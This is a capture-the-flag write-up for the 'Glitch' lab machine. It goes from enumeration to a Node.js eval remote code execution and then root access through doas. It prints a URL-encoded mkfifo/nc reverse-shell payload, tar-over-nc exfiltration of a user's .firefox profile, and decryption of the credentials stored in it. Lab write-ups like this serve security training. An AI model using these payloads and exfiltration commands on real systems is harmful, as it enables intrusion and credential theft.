# CTF Writeup: Glitch

---

- Step 1: Made nmap scan --> only port 80 open
- Step 2: found hidden /secret dir and source code said that /api/access token gets stored
- Step 3: grabbed it with --> curl -s http://target_ip/api/access
- Step 4: decoded the base64 string --> this_is_not_real --> put this code inside the token value on the /secret dir and found new picture --> retrieved the picture
--> made exiftool rabbit.png, but no usable metadata.
- Step 5: replaced api token with "this_is_not_real" within webpage --> and got prompted
to new page --> analyzed the new page, but there is nothing important
- Step 6: decided to further enumerate the /api directory --> found /api/items 
--> intercepted traffic into my proxy and changed the request from GET to POST -->
since this is in the hint of the CTF --> got a new prompt:

there_is_a_glitch_in_the_matrix --> but this didn't help me
- Step 7: had to do research after this --> another methodology which should be taken
in consideration in the enumeration proccess is enumerating parameters --> decided to
enumerate /api/items?SQSQQS=SQSQSQ 
- Step 8: made --> curl -X POST http://glitch.thm/api/items?EQEQ=EQEQE | wc -l and piped it
to wc -l to findout how large the word-count is. --> preperation for filtering
- Step 9: made ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -u http://glitch.thm/api/items?FUZZ=FEQEQQE -fs 45 -mc all --> got cmd parameter
- Step 10: Isolated package in my repeater --> burpsuite and changed request to POST and made ?cmd=ls 
--> received indicators to possible node.js eval function exploit --> rce possible? 
- Step 11: since eval function executes any code which is javascript --> decided to go for js rce require(%22child_process%22).exec(%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.21.156.104%201234%20%3E%2Ftmp%2Ff%27), also had to url-encode the whole command and change request to POST + started listener on port 1234 
- Step 12: After gaining rce I retrieved the user.txt --> hint for root flag says "sudo is bloated" 
- Step 13: .firefox looked interesting since it could give us user creds if it gets decrypted --> made nc -lvp 1234 | tar xf - to start listener on my local machine 
- Step 14: made tar cf - .firefox/ | nc 10.21.156.104 1234 to get directory on my local machine --> received it
- Step 15: Installed firefox_decrypter.py onto my local machine and ran it on 2nd user -- gained creds of v0id 
- Step 16: After some extensive research I have found an way --> made find / -perm /4000 2>/dev/null to look for binaries --> found an unusual one "doas" which runs executables
with root rights --> exploited this --> logged into v0id and made --> doas -u root /bin/bash --> got rce as root and retrieved flag

---

## Key Learnings

- Strengthened Enumerating CLI Knowledge for FFUF "wc -l" + -mc all - 
- Learned about .firefox user cred decryption 
- Added new tool firefox_decrypter.py
